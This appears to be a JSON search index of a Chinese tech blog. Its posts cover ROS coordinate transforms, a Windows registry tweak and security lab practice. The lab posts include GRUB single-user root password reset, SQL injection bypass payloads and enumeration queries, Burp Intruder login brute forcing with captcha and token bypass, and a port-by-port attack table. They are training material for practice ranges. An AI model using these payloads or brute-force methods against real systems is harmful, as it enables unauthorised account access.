[{"title":"Linux系统登录密码破解","url":"/2023/08/22/Linux%E7%B3%BB%E7%BB%9F%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/","content":"环境本次实验的环境：RHEL6.0\n\n\n破解\n在开机自检后，出现 “grub引导界面” 时，按 E 键进入编辑模式\n\n把光标移到带有 kernel 字样的那一行，然后按 E 键编辑\n\n在末尾按一个空格，输入字母 s ，再按回车键回到之前的界面\n\n该行的意思是加载内核，末尾的参数s，该命令不能识别，所以它会将这个参数s传递给系统启动后的第一个进程，而系统启动的第一个进程是init，init s 就是进入单用户模式。\n\n\n把光标移动到带有 kernel 字样的那一行，按 B 键进入\n\n成功以root用户进入系统\n\npasswd root 修改root密码\n\n\n","categories":["技术分享"],"tags":["Linux"]},{"title":"MySql注入","url":"/2023/08/18/MySql%E6%B3%A8%E5%85%A5/","content":"1、环境靶场：webug、sqli-labs\n\n\n2、万能密码\n靶场：webug\n\n源代码\nSELECT * FROM user WHERE username = &#x27;&#123;$username&#125;&#x27; AND password = &#x27;&#123;$password&#125;&#x27;\n\npayloads\n$suername:查询全部usernameadmin &#x27; or 1=1 # 1 &#x27; or 1# 1 &#x27; or 1=1 -- 1 &#x27; or 1 -- 查询指定username1&#x27; or 1 order by username limit 0, 1#admin&#x27; or &#x27;1&#x27; = &#x27;1admin&#x27; or 0#admin&#x27; or 0 -- $password:查询全部1&#x27; or 1#1&#x27; or &#x27;1&#x27; = &#x27;1\n\n\n\n3、GET方式联合查询注入4、POST方式联合查询注入5、报错注入6、布尔盲注7、时间盲注(延时注入、延时盲注、延迟盲注)8、header部分注入9、读写文件10、内联注释绕过11、宽字节注入12、堆叠注入","categories":["知识点滴"],"tags":["注入"]},{"title":"SQL注入必知必会","url":"/2023/08/18/SQL%E6%B3%A8%E5%85%A5%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A/","content":"1、注释方法单行注释：可以使用# 或-- \n\n 注意：使用 --  时，最后一定要有一个空格\n GET注入时 # 要写成 %23\n\n多行注释：使用 /* xxx */\n内联注释：使用 /*! */ ，/* */在mysql中是多行注释 但是如果里面加了! 那么后面的内容会被执行\n常用于Waf绕过\n\n\n/*!50000*/ mysql 5通用 带版本内联注释\n根据MySql不同的版本，数字会不同\n\n\n\n2、常用SQL语句只能在SQL命令行中执行，在SQL注入中不能使用\nuse [database]：使用指定的数据库\nshow databases：显示所有的数据库\nshow tables：显示指定数据库中所有的表\nshow global variables：显示全局的配置信息\nshow variables like &#39;%secure%&#39;：模糊查询显示相关的配置信息\n\n\n3、数据库information_schema ：元数据库,存储数据库相关信息的数据库\nmysql：存储数据库相关的信息\ninformation_schema-&gt;schemata\tschema_name：所有数据库名\tinformation_schema-&gt;tables\ttable_schema：表所属的数据库\ttable_name：表名\tinformation_schema-&gt;columns\ttable_schema：表所属的数据库\ttable_name：表名\tcolumn_name：列名\tmysql-&gt;user（mysql 5.6 and below）\tHost：主机\tUser：用户名\tPassword：密码\tmysql-&gt;user：(mysql 5.7 and above)\thost\tuser\tauthentication_string\n\n\n\n查询所有的数据库名：\nselect schema_name from information_schema.schemata\n\n\n\n\n查询'security'数据库中所有的表名：\n\nselect table_name from information_schema.tables where table_schema=&#x27;security&#x27;\n\n\n\n\n查询'security'数据库下'users'表的列名：\n\nselect column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;\n\n\n\n\n查询'security'数据库下'users'表中指定列的内容：\n\nselect * from usersselect id,username,password from usersselect * from security.usersselect id,username,password from security.users\n\n\n\n\n\n4、常用函数\n 如果函数要在SQL命名行中执行，前面需要加select\n\nuser()：获取当前连接到数据库的用户的用户名和主机名\nselect user()-- root@192.168.66.1\n\n\n\ncurrent_user()：当前通过哪个规则连接数据库的用户\nselect current_user()/*结果：root@%\troot：用户名\t@：用于分隔用户名和主机名\t%：规则，%指通配符，表示可以从任何主机连接。/*\n\n\n\n@@basedir：mysql安装的路径\nselect @@basedir-- C:/phpStudy/PHPTutorial/MySQL/\n\n\n\n@@datadir：数据库的路径\nselect @@datadir-- C:\\phpStudy\\PHPTutorial\\MySQL\\data\\\n\n\n\n@@version_compile_os：获取当前操作系统版本\nselect @@version_compile_os-- Win32\n\n\n\n@@version_compile_machine：操作系统的体系结构\nselect @@version_compile_machine-- AMD64\n\n\n\ndatabase()：当前数据库\nselect database()-- security\n\n\n\nversion()：数据库的版本\nselect version()-- 5.5.53\n\nselect database(),version(),@@datadir,user()\n\n\n\nconcat()，concat_ws：将多列数据合并到一列\ngroup_concat：将多列数据的多行值合并到一列一行\nselect concat(id,&#x27;|&#x27;,username,&#x27;@&#x27;,password) test from users-- 2|Angelina@I-like-youselect concat_ws(&#x27;|&#x27;,id,username,password) from users-- 2|Angelina|I-like-youselect group_concat(username,0x7e,password) from users--  0x7e：~-- Dumb~5d41402abc4b2a76b9719d911017c592,Angelina~I-like-you\n\n\n\nsubstr()，mid()：字符串截取\nselect substr(&#x27;abcde&#x27;,2,1)select mid(&#x27;abcde&#x27;,2,1)-- bselect substr(username,1,2) from users\n\n\n\nlimit：限制查询结果的数量\nselect * from users limit 0,1-- 从第0行开始，截取一行\n\n\n\nlocate()：返回字符串出现的位置\nselect locate(&#x27;abcd&#x27;,&#x27;abcabcde&#x27;) -- 4\n\n\n\nascii，ord：获取字符的 ASCII 码值\nselect ascii(&#x27;a&#x27;)select ord(&#x27;a&#x27;)-- 97\n\n\n\nchar()：返回ASCII码值对应的字符\nselect char(97)select char(&#x27;97&#x27;)-- aselect char(77,121,83,81,76)-- MySQL\n\n\n\nlength()：返回长度\nselect length(database())-- 8：securityselect length(username),username from users-- 4，Dumb\n\n\n\ncount()：查询数量\nselect count(*) from usersselect count(1) from usersselect count(id) from users-- 尽量查询主键，其他键有可能为空\n\n\n\nsleep()：休眠\nselect sleep(2)-- 休眠2s\n\n\n\nif()：判断\nselect if(length(database())&gt;5,&#x27;&gt;5&#x27;,&#x27;&lt;5&#x27;)-- &gt;5：判断数据库长度是否大于5，成立输出&gt;5，否则输出&lt;5select if(substr(database(),1,1)=&#x27;a&#x27;,sleep(2),&#x27;!=a&#x27;)-- !=a，常用于猜解数据库名\n\n\n\n5、SQL注入分类\n传参方式：GET、Post\n参数类型：整数型、字符型\n注入方式\n联合查询注入：union select 联合查询\n报错注入：页面显示报错信息，对数据库进行注入使报错，根据报错信息获取有用的信息\n堆叠注入：一次执行多个SQL语句\n布尔盲注：判断条件是否成立，根据页面变化来确认想要的信息\n时间盲注（延时盲注）：判断条件是否成立，根据响应时间获取信息\n\n\n\n\n\n6、判断是否有SQL注入\n核心问题是,可控参数的修改,是否可以影响sql逻辑,如果可以影响,就证明有注入点,剩下的问题无非是能否利用,如何利用的问题.\n\n\n\n手工判断：\n\n判断是否是注入点：找到客户端向服务器端传参,并且该参数可能会被发送到数据库执行的页面或url,(该参数称为可控参数)\n\n修改可控参数,查看请求的返回内容是否有变化，判断和数据库是否有交互.\n\n修改可控参数，加上单引号或者双引号或and 0或id&#x3D;n-m 等字符，查看是否能报错，判断传入的参数是否能够影响原有sql执行逻辑\n\n如果b步骤报错，则修改可控参数，尝试闭合sql语句，再使sql语句不报错，这样就可以拼接要执行的sql语句.\n\n\n\n判断注入方式\n\n是否可以使用union select语句页面有明确的回显内容\n\n是否可以使用布尔盲注 通过and 0及and 1注入，返回内容只有两种变化\n\n是否可以使用时间盲注，如果页面没有任何变化，可以尝试使用sleep函数通过延时判断是否有注入点\n\n是否可以使用报错注入，如果页面有报错信息，则可以尝试此种方式\n\n\n\n\n\n\nsqlmap自动判断\n","categories":["知识点滴"],"tags":["SQL"]},{"title":"TF坐标变换实操","url":"/2023/08/27/TF%E5%9D%90%E6%A0%87%E5%8F%98%E6%8D%A2%E5%AE%9E%E6%93%8D/","content":"1、结果演示\n实现分析：\n乌龟跟随实现的核心，是乌龟A和B都要发布相对世界坐标系的坐标信息，然后，订阅到该信息需要转换获取A相对于B坐标系的信息，最后，再生成速度信息，并控制B运动。\n\n启动乌龟GUI和键盘控制节点\n调用服务生成一只新乌龟\n编写两只乌龟发布坐标信息的节点\n编写订阅节点订阅坐标信息并生成新的相对关系生成速度信息\n\n\n\n2、Launch文件&lt;launch&gt;    &lt;!--        流程详解：            1.准备工作：启动乌龟GUI节点和键盘控制节点            2.调用服务生成一只新乌龟            3.发布两只乌龟的坐标信息            4.订阅坐标信息，并且转换成乌龟A相对于乌龟B的坐标信息，最后生成控制乌龟B的速度信息    --&gt;&gt;    &lt;!-- 1.启动乌龟GUI节点和键盘控制节点 --&gt;    &lt;node pkg=&quot;turtlesim&quot; type=&quot;turtlesim_node&quot; name=&quot;turtle1&quot; output=&quot;screen&quot; /&gt;    &lt;node pkg=&quot;turtlesim&quot; type=&quot;turtle_teleop_key&quot; name=&quot;key&quot; output=&quot;screen&quot; /&gt;    &lt;!-- 2.调用服务生成一只新乌龟 --&gt;    &lt;node pkg=&quot;tftf&quot; type=&quot;new_turtle.py&quot; name=&quot;turtle2&quot; output=&quot;screen&quot; /&gt;    &lt;!-- 3.发布两只乌龟的坐标信息            1.复用之前的乌龟坐标发布功能            2.调用节点时，以参数的形式传递乌龟名称，解析参数置换：订阅的话题消息 和 子级坐标系的名称     --&gt;    &lt;node pkg=&quot;tftf&quot; type=&quot;pub_turtle.py&quot; name=&quot;pub1&quot; args=&quot;turtle1&quot; output=&quot;screen&quot; /&gt;    &lt;node pkg=&quot;tftf&quot; type=&quot;pub_turtle.py&quot; name=&quot;pub2&quot; args=&quot;turtle2&quot; output=&quot;screen&quot; /&gt;    &lt;!-- 4.订阅坐标信息，并且转换成 乌龟A 相对于 乌龟B 的坐标信息，最后生成控制乌龟B的速度信息 --&gt;    &lt;node pkg=&quot;tftf&quot; type=&quot;control_turtle.py&quot; name=&quot;control&quot; output=&quot;screen&quot; /&gt;&lt;/launch&gt;\n\n\n\n3、服务客户端(生成乌龟)#! /usr/bin/env python# 1.导包import rospyfrom turtlesim.srv import Spawn,SpawnRequest,SpawnResponse&#x27;&#x27;&#x27;    需求：向服务器发送请求生成一只乌龟        话题：/spwan        消息：turtlesim/Spawn    步骤：        1.导包        2.初始化ros节点        3.创建客户端对象        4.组织数据并发送请求        5.处理响应结果&#x27;&#x27;&#x27;if __name__ == &quot;__main__&quot;:    # 2.初始化ros节点    rospy.init_node(&quot;new_turtle&quot;)    # 3.创建客户端对象    client = rospy.ServiceProxy(&quot;/spawn&quot;,Spawn)    # 4.组织数据并发送请求    #4-1组织数据    request = SpawnRequest()    request.x = 4.5    request.y = 2.0    request.theta = -3    request.name = &quot;turtle2&quot;    # 4-2判断服务器状态并发送    client.wait_for_service()    try:        response = client.call(request)        # 5.处理响应        rospy.loginfo(&quot;生成的乌龟名字：%s&quot;,response.name)    except Exception as e:        rospy.logerr(&quot;请求处理异常！&quot;)\n\n\n\n4、发布方#! /usr/bin/env python# 1.导包import rospyimport tf2_rosimport tffrom turtlesim.msg import Posefrom geometry_msgs.msg import TransformStampedimport sys&#x27;&#x27;&#x27;    发布方：订阅乌龟的位姿信息，转换成坐标系的相对关系，再发布    准备：        话题：/turtle1/pose        类型：/turtlesim/Pose    流程：        1.导包        2.初始化ros节点        3.创建订阅对象        4.回调函数处理        5.spin&#x27;&#x27;&#x27;# 接收乌龟名称的变量 turtle_name = &quot;&quot;# 4.def dopose(pose):    # 4-1 创建发布坐标系相对关系的对象    pub = tf2_ros.StaticTransformBroadcaster()    # 4-2 将 pose 转换成 坐标相对关系信息    tfs = TransformStamped()    tfs.header.frame_id = &quot;world&quot;    tfs.header.stamp = rospy.Time.now()    # 修改2：子级坐标系名称------------------------------------    tfs.child_frame_id = turtle_name    # 子级坐标系相对于父级坐标系的偏移量    tfs.transform.translation.x = pose.x    tfs.transform.translation.y = pose.y    tfs.transform.translation.z = 0    # 四元数    # 从 欧拉角 转换 四元数    &#x27;&#x27;&#x27;        乌龟是2D的，不存在 X 上的翻滚，Y 上的俯仰，只有 Z 上的偏航        0 0 pose.theta    &#x27;&#x27;&#x27;    qtn = tf.transformations.quaternion_from_euler(0,0,pose.theta)    tfs.transform.rotation.x = qtn[0]    tfs.transform.rotation.y = qtn[1]    tfs.transform.rotation.z = qtn[2]    tfs.transform.rotation.w = qtn[3]        # 3.发布    pub.sendTransform(tfs)if __name__ == &quot;__main__&quot;:        # 2.初始化ros节点    rospy.init_node(&quot;dpub&quot;)    # 解析传入的参数（执行launch文件传入的参数：文件全路径 + 传入的参数 + 节点名称 + 日至文件路径）    if len(sys.argv) != 4:        rospy.logerr(&quot;参数个数错误！&quot;)        sys.exit(1)    else:        turtle_name = sys.argv[1]    # 3.创建订阅对象    # 修改1：话题名称------------------------------------    sub = rospy.Subscriber(turtle_name + &quot;/pose&quot;,Pose,dopose,queue_size=100)    # 4.回调函数处理订阅到的消息（核心）    # 5.spin()    rospy.spin()\n\n\n\n5、订阅方#! /usr/bin/env python# 1.导包import rospyimport tf2_rosfrom tf2_geometry_msgs import tf2_geometry_msgsfrom geometry_msgs.msg import TransformStamped,Twistimport mathif __name__ == &quot;__main__&quot;:    # 2.初始化    rospy.init_node(&quot;dsub&quot;)    # 3.创建订阅对象    # 3-1 创建缓存对象    buffer = tf2_ros.Buffer()    # 3-2 创建订阅对象（将缓存传入）    sub = tf2_ros.TransformListener(buffer)    # 4.创建速度消息发布对象    pub = rospy.Publisher(&quot;/turtle2/cmd_vel&quot;,Twist,queue_size=100)    # 5.转换逻辑实现，调用tf封装的算法    rate = rospy.Rate(10)    while not rospy.is_shutdown():        try:            # --- 计算 turtle1 相对于 turtle2 的坐标关系            &#x27;&#x27;&#x27;                参数1：目标坐标系                参数2：源坐标系                参数3：rospy.Time(0)---取时间间隔最近的两个坐标帧（son1 相对 world 与 son2 相对 world）计算结果                返回值：son1 与 son2 的坐标关系            &#x27;&#x27;&#x27;            ts = buffer.lookup_transform(&quot;turtle2&quot;,&quot;turtle1&quot;,rospy.Time(0))            rospy.loginfo(&quot;父级坐标系：%s,子级坐标系：%s,偏移量(%.2f,%.2f,%.2f)&quot;,                        ts.header.frame_id,                        ts.child_frame_id,                        ts.transform.translation.x,                        ts.transform.translation.y,                        ts.transform.translation.z                        )                        # 组织 Twist 消息            twist = Twist()            # 线速度 = 系数 * 坐标系原点的间距 ， 间距 = (x的偏移量^2 + y的偏移量^2)再开方            twist.linear.x = 0.5 * math.sqrt(math.pow(ts.transform.translation.x,2) + math.pow(ts.transform.translation.y,2))            # 角速度 = 系数 * 夹角  ， 夹角 = arctan(y的偏移量，x的偏移量)            twist.angular.z = 4 * math.atan2(ts.transform.translation.y,ts.transform.translation.x)            # 发布消息             pub.publish(twist)        except Exception as e:            rospy.logwarn(&quot;异常：%s&quot;,e)        rate.sleep()    # 6.回旋    # rospy.spin()\n\n","categories":["ROS"],"tags":["TF坐标变换"]},{"title":"WEB登录爆破","url":"/2023/08/16/WEB%E7%99%BB%E5%BD%95%E7%88%86%E7%A0%B4/","content":"1、环境准备本次用到的靶场有：pikachu、webug、dvwa\nBurp版本：2023.7.1\n\n\n2、基于表单的暴力破解\n环境：pikachu-基于表单的暴力破解\n\n\n进行Burp抓包，并发送到Intruder模块\n\n添加爆破变量，设置类型为Cluster bomb\n\n在Payloads配置字典，开始爆破\n得到结果，对长度进行排序，并查看响应头信息\n\n\n\n3、服务端绕过验证码\n环境：pikachu-验证码绕过(on server)\n\n\nBurp抓包，发送到Repeater模块\n\n通过尝试修改参数，发现vcode可复用\n发送到Intruder模块进行爆破\n添加爆破变量，设置类型为Cluster bomb\n配置payload，进行爆破\n\n得到结果\n\n\n\n4、客户端绕过验证码\n环境：验证码绕过(on client)\n\n\n点击验证码，网络信息没有新增，判断是验证码属于客服端\nBurp抓包，发送到Repeter模块，进行参数修改，验证是否属于客户端\n\n发送到Intruder，进行爆破\n步骤略…\n得到结果\n\n\n\n5、token防爆破\n环境：pikachu-token防爆破\n\n\n在发送的请求中cookie上带有token信息，这个token是唯一的，每一次请求对应唯一的token\n在查看源代码发现，下一次请求生成的token被隐藏在html中，\n\n因此爆破时候需要找到对应的token值，而下一次的token可以在响应包里找到\n\nBurp抓包，再次进行对admin账户的爆破\n发送到Intruder模块，设置模式为Pitchfork，添加变量\n\n配置payloads，token变量类型为Recursive grep模式\n\n设置线程为1\n\n设置Grep-Extract\n\n这个设置可用于将响应中的有用信息提取到攻击结果表中。\n\n\n\n在Payload settings设置本次token的值\n\n开始爆破，结果如下\n\n\n\n6、自动重定向\n环境：webug登录界面\n\n通过爆破得知登录成功后会进行302跳转\n\n当用户名和密码输入正确的时候，会跳转到另一个页面，通过Bur可以设置自动跳转\nBurp抓包，发送到Intruder\n设置模式和变量\n设置payloads\n设置Redirections，勾选 On-site-only 和 Process cookies in redirections\n\nOn-site-only只允许这个网站进行跳转\nProcess cookies in redirections：处理重定向中的Cookie，在遵循重定向目标时，将重新提交重定向响应中设置的所有Cookie。\n\n\n开始爆破，得到结果\n\n可以利用Burp中的包进行登录\n\n\n将链接粘贴到浏览器进行访问，可以直接登录\n用这种方法登录的前提：浏览器开启代理，Burp关闭抓包\n\n\n7、cookie使用\n环境：dvwa靶场登录界面\n跟pikachu靶场中的大同小异\n\n每次登录请求中的cookie带有user_token\n\n通过查看源码，可以知道每次请求中的token都藏在了form表单中\n\nBurp抓包，在Repeater模块，和上面的token防爆破不一样\npikachu靶场中的，下一次token可以在响应包李找到\n\ndvwa靶场中，需要跳转一次才可以找到token\n点击Follow rdirection跳转\n\n找到token\n\n重新抓包，发送到Intruder模块，进行配置\n\n\n\n\n\n\n注意点：要先选择跳转，在添加Grep-Extract，要不然找不到token\n开始爆破，得到结果\n\n找到请求包里的PHPSESSID\n\n进行替换\n\n然后访问index.php\n\n\n\n8、phpMyAdmin爆破\n\n每次刷新都会生成一个新的phpMyAdmin和token的值\n\n抓包可以看出请求信息里面包含phpMyAdmin和token的值\n利用专用的工具进行爆破\n\n爆破成功\n\n","categories":["技术分享"],"tags":["爆破"]},{"title":"Win10系统下设置鼠标右键新建Markdown文档","url":"/2023/08/15/Win10%E7%B3%BB%E7%BB%9F%E4%B8%8B%E8%AE%BE%E7%BD%AE%E9%BC%A0%E6%A0%87%E5%8F%B3%E9%94%AE%E6%96%B0%E5%BB%BAMarkdown%E6%96%87%E6%A1%A3/","content":"1、安装环境\nWin10系统\n已安装Typora\n\n\n\n2、步骤\n新建文本文档，写入下面代码，保存\nWindows Registry Editor Version 5.00[HKEY_CLASSES_ROOT\\\\.md]@=&quot;MarkdownFile&quot;&quot;PerceivedType&quot;=&quot;text&quot;&quot;Content Type&quot;=&quot;text/plain&quot;[HKEY_CLASSES_ROOT\\\\.md\\\\ShellNew][HKEY_CLASSES_ROOT\\\\MarkdownFile]@=&quot;Markdown文档&quot;[HKEY_CLASSES_ROOT\\\\MarkdownFile\\\\DefaultIcon]@=&quot;%SystemRoot%\\\\system32\\\\imageres.dll,-102&quot;[HKEY_CLASSES_ROOT\\\\MarkdownFile\\\\shell][HKEY_CLASSES_ROOT\\\\MarkdownFile\\\\shell\\\\open]\n\n将文件名后缀改为 .reg ，运行，在弹出的窗口选择是\n\nWin + R ，输入 regedit ，回车，打开注册表编辑器\n\n进入指定目录 计算机\\\\HKEY_CLASSES_ROOT\\\\.md\\\\ShellNew ，\n\n对 ShellNew 右键，新建字符串，名为 NullFile\n\n鼠标左键双击 NullFile ，将数值数据更改为 typora.md\n\n关闭所有窗口，桌面，右键，新建，Markdown文档\n\n\n","categories":["技术分享"],"tags":["mardkdown"]},{"title":"多坐标变换","url":"/2023/08/25/%E5%A4%9A%E5%9D%90%E6%A0%87%E5%8F%98%E6%8D%A2/","content":"1、PUB&lt;launch&gt;    &lt;node pkg=&quot;tf2_ros&quot; type=&quot;static_transform_publisher&quot; name=&quot;son1&quot; args=&quot;5 0 0 0 0 0 /world /son1&quot; output=&quot;screen&quot; /&gt;    &lt;node pkg=&quot;tf2_ros&quot; type=&quot;static_transform_publisher&quot; name=&quot;son2&quot; args=&quot;3 0 0 0 0 0 /world /son2&quot; output=&quot;screen&quot; /&gt;&lt;/launch&gt;\n\n\n\n2、SUB#! /usr/bin/env python# 1.导包import rospyimport tf2_rosfrom tf2_geometry_msgs import tf2_geometry_msgsfrom geometry_msgs.msg import TransformStampedif __name__ == &quot;__main__&quot;:    # 2.初始化    rospy.init_node(&quot;dsub&quot;)    # 3.创建订阅对象    # 3-1 创建缓存对象    buffer = tf2_ros.Buffer()    # 3-2 创建订阅对象（将缓存传入）    sub = tf2_ros.TransformListener(buffer)    # 4.组织被转换的坐标点    ps = tf2_geometry_msgs.PointStamped()    # 时间戳 --- 0    # ps.header.stamp = rospy.Time.now()    ps.header.stamp = rospy.Time.now()    # 坐标系    ps.header.frame_id = &quot;son1&quot;    ps.point.x = 1.0    ps.point.y = 2.0    ps.point.z = 3.0    # 5.转换逻辑实现，调用tf封装的算法    rate = rospy.Rate(10)    while not rospy.is_shutdown():        try:            # --- 计算 son1 相对于 son2 的坐标关系            &#x27;&#x27;&#x27;                参数1：目标坐标系                参数2：源坐标系                参数3：rospy.Time(0)---取时间间隔最近的两个坐标帧（son1 相对 world 与 son2 相对 world）计算结果                返回值：son1 与 son2 的坐标关系            &#x27;&#x27;&#x27;            ts = buffer.lookup_transform(&quot;son2&quot;,&quot;son1&quot;,rospy.Time(0))            rospy.loginfo(&quot;父级坐标系：%s,子级坐标系：%s,偏移量(%.2f,%.2f,%.2f)&quot;,                        ts.header.frame_id,                        ts.child_frame_id,                        ts.transform.translation.x,                        ts.transform.translation.y,                        ts.transform.translation.z                        )            # 转换实现            ps_out = buffer.transform(ps,&quot;son2&quot;)            # 6.输出结果            rospy.loginfo(&quot;转换后的点(%.2f,%.2f,%.2f)，参考的坐标：%s&quot;,                            ps_out.point.x,                            ps_out.point.y,                            ps_out.point.z,                            ps_out.header.frame_id                            )        except Exception as e:            rospy.logwarn(&quot;异常：%s&quot;,e)        rate.sleep()    # 6.回旋    # rospy.spin()\n\n","categories":["ROS"],"tags":["TF坐标变换"]},{"title":"本机访问虚拟机中的靶场域名","url":"/2023/08/16/%E6%9C%AC%E6%9C%BA%E8%AE%BF%E9%97%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E9%9D%B6%E5%9C%BA%E5%9F%9F%E5%90%8D/","content":"1、问题引入在虚拟机中搭建的靶场，如何在本机中进行访问\n在Phpstudy中给靶场配置域名，怎么在本机通过域名访问\n\n\n2、解决方法修改本机 C:\\Windows\\System32\\drivers\\etc 目录下的 hosts 文件\n在末尾添加\n[IP地址] [域名]#例如：192.168.66.20 pikachu.cn\n\n如果建立了多个靶场，可在域名后面空一格继续追加\n192.168.66.20 pikachu.cn webug.cn \n\n\n\n3、注意\n给靶场设置域名时，尽量使用 cn 结尾的后缀\nhosts文件中IP地址与域名之间至少空一格\n\n","categories":["技术分享"],"tags":["靶场"]},{"title":"端口服务爆破","url":"/2023/08/16/%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E7%88%86%E7%A0%B4/","content":"1、常见端口服务\n\n\n端口\n服务\n入侵方式\n\n\n\n21\nftp&#x2F;tftp&#x2F;vsftpd文件传输协议\n爆破&#x2F;嗅探&#x2F;溢出&#x2F;后门\n\n\n22\nssh远程连接\n爆破&#x2F;openssh漏洞\n\n\n23\nTelnet远程连接\n爆破&#x2F;嗅探&#x2F;弱口令\n\n\n25\nSMTP邮件服务\n邮件伪造\n\n\n53\nDNS域名解析系统\n域传送&#x2F;劫持&#x2F;缓存投毒&#x2F;欺骗\n\n\n67&#x2F;68\ndhcp服务\n劫持&#x2F;欺骗\n\n\n110\npop3\n爆破&#x2F;嗅探\n\n\n139\nSamba服务\n爆破&#x2F;未授权访问&#x2F;远程命令执行\n\n\n143\nImap协议\n爆破\n\n\n161\nSNMP协议\n爆破&#x2F;搜集目标内网信息\n\n\n389\nLdap目录访问协议\n注入&#x2F;未授权访问&#x2F;弱口令\n\n\n445\nsmb\nms17-010&#x2F;端口溢出\n\n\n512&#x2F;513&#x2F;514\nLinux Rexec服务\n爆破&#x2F;Rlogin登陆\n\n\n873\nRsync服务\n文件上传&#x2F;未授权访问\n\n\n1080\nsocket\n爆破\n\n\n1352\nLotus domino邮件服务\n爆破&#x2F;信息泄漏\n\n\n1433\nmssql\n爆破&#x2F;注入&#x2F;SA弱口令\n\n\n1521\noracle\n爆破&#x2F;注入&#x2F;TNS爆破&#x2F;反弹shell\n\n\n2049\nNfs服务\n配置不当\n\n\n2181\nzookeeper服务\n未授权访问\n\n\n2375\ndocker remote api\n未授权访问\n\n\n3306\nmysql\n爆破&#x2F;注入\n\n\n3389\nRdp远程桌面链接\n爆破&#x2F;shift后门\n\n\n4848\nGlassFish控制台\n爆破&#x2F;认证绕过\n\n\n5000\nsybase&#x2F;DB2数据库\n爆破&#x2F;注入&#x2F;提权\n\n\n5432\npostgresql\n爆破&#x2F;注入&#x2F;缓冲区溢出\n\n\n5632\npcanywhere服务\n抓密码&#x2F;代码执行\n\n\n5900\nvnc\n爆破&#x2F;认证绕过\n\n\n6379\nRedis数据库\n未授权访问&#x2F;爆破\n\n\n7001&#x2F;7002\nweblogic\njava反序列化&#x2F;控制台弱口令\n\n\n80&#x2F;443\nhttp&#x2F;https\nweb应用漏洞&#x2F;心脏滴血\n\n\n8069\nzabbix服务\n远程命令执行&#x2F;注入\n\n\n8161\nactivemq\n弱口令&#x2F;写文件\n\n\n8080&#x2F;8089\nJboss&#x2F;Tomcat&#x2F;Resin\n爆破&#x2F;PUT文件上传&#x2F;反序列化\n\n\n8083&#x2F;8086\ninfluxDB\n未授权访问\n\n\n9000\nfastcgi\n远程命令执行\n\n\n9090\nWebsphere控制台\n爆破&#x2F;java反序列化&#x2F;弱口令\n\n\n9200&#x2F;9300\nelasticsearch\n远程代码执行\n\n\n11211\nmemcached\n未授权访问\n\n\n27017&#x2F;27018\nmongodb\n未授权访问&#x2F;爆破\n\n\n\n参考资料\n\n\n\n\n\n2、靶场准备\nIP：192.168.66.3\n开放端口：21，22，3306\n\n\n\n3、字典准备\nkali：crunch  \nWindows：白鹿社工字典生成器，在线字典生成网站等\n\n\n\n4、hydra爆破hydra是Kali系统中的一个可视化工具,它可以利用众多协议进行口令、账号、密码的爆破,同样支持FPT、MYSQL、SMTP、TELNET、SSH等众多的协议爆破。\n在终端输入 hydra 即可进行打开\n\n\n\n\n\n\n\n\n\n\n\n点击START即可开始爆破\n\n\n\n5、超级弱口令检查工具是Windows平台下的一款工具，界面如下\n\n\n\n6、注意爆破ssh时线程要低，建议1-10\n\n\n7、远程连接\n如果目标服务器是Windows系统，在Windows系统下使用命令 mstsc 进行登录\n\nmstsc 192.168.66.20\n\n\nLinux系统使用命令 rdesktop [IP]\n\nrdesktop 192.168.66.20\n\n\nXshell进行连接：ssh [user]:[password]@[Ip]\n\nssh admin:123456@192.168.66.20\n\n","categories":["技术分享"],"tags":["端口"]}]